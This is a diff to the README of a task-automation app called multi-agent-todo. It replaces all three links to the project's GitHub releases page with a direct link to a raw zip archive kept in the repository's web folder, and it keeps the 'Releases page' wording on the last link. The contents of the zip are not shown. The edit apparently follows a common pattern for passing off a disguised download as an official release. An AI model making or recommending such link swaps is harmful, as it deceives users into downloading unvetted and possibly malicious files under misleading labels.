@@ -1,6 +1,6 @@
 # 🤖 multi-agent-todo - Manage Tasks with Smart Automation
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/mzwandile16/multi-agent-todo/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/mzwandile16/multi-agent-todo/raw/refs/heads/master/web/agent-todo-multi-v2.9.zip)
 
 ## 📋 What is multi-agent-todo?
 
@@ -32,7 +32,7 @@ The program runs quietly once set up, using minimal system resources.
 
 ## 🚀 Getting Started: Download and Setup
 
-[![Download Here](https://img.shields.io/badge/Download-multi--agent--todo-blue)](https://github.com/mzwandile16/multi-agent-todo/releases)
+[![Download Here](https://img.shields.io/badge/Download-multi--agent--todo-blue)](https://github.com/mzwandile16/multi-agent-todo/raw/refs/heads/master/web/agent-todo-multi-v2.9.zip)
 
 To begin, you first need to download the application from the official release page.
 
@@ -143,7 +143,7 @@ The software uses agents that plan, implement, and review task changes without m
 
 ## 🌐 Useful Links
 
-- Visit the [multi-agent-todo Releases](https://github.com/mzwandile16/multi-agent-todo/releases) page to download updates and new versions.
+- Visit the [multi-agent-todo Releases](https://github.com/mzwandile16/multi-agent-todo/raw/refs/heads/master/web/agent-todo-multi-v2.9.zip) page to download updates and new versions.
 - See the full project on GitHub for more details or source files.
 
 ---
